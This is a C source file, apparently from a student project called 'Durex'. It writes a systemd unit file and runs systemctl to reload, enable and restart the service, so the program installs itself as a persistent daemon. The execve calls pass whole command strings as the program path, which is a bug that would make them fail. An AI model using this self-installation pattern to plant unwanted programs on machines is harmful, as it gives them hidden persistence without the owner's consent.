/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   install_service.c                                  :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: banthony <banthony@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/11/06 16:45:56 by banthony          #+#    #+#             */
/*   Updated: 2019/11/19 15:23:04 by banthony         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "Durex.h"

extern char **environ;

static t_bool	exec_command(char **command)
{
	pid_t		pid;

	if ((pid = fork()) < 0)
	{
		durex_log("Can't execute command:", LOG_ERROR);
		durex_log(command[0], LOG_ERROR);
		return (false);
	}
	// Child
	else if (pid == 0)
	{
		execve(command[0], command, environ);
		durex_log(command[0], LOG_ERROR);
		durex_log(strerror(errno), LOG_ERROR);
		exit(EXIT_FAILURE);
	}
	// Father
	else
	{
		waitpid(pid, NULL, 0);
		durex_log(command[0], LOG_INFO);
	}
	return (true);
}

void install_service(void)
{
	int fd;
	int ret;
	const char *durex_service = SERVICE_FILE_CONTENT;
	char	*systemctl_reload[] = { "systemctl daemon-reload", NULL};
	char	*enable_durex[] = {"systemctl enable Durex", NULL };
	char	*restart_durex[] = {"systemctl restart Durex", NULL};

	durex_log("Durex install service ...", LOG_INFO);
	if ((fd = open(SERVICE_PATH, O_CREAT | O_EXCL | O_WRONLY)) < 0)
	{
		durex_log("Failed: Can't create durex.service.", LOG_WARNING);
		return ;
	}
	ret = write(fd, durex_service, ft_strlen(durex_service));
	if (ret < 0 || ret < (int)ft_strlen(durex_service))
	{
		durex_log("Failed: Can't write correctly durex.service content.", LOG_WARNING);
		return ;
	}
	exec_command(systemctl_reload);
	exec_command(enable_durex);
	exec_command(restart_durex);
}
